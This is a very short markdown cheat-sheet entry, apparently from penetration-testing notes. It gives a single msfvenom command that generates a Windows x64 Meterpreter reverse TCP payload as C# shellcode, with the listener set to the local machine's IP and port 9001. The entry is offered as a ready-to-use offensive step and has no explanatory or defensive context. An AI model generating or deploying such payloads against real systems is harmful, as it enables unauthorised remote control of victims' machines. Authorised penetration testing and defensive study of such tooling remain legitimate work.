
## Msfvenom

#### Windows x64
- meterpreter reverse tcp
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$(hostname -I | cut -d' ' -f1) LPORT=9001 EXITFUNC=thread -f csharp
```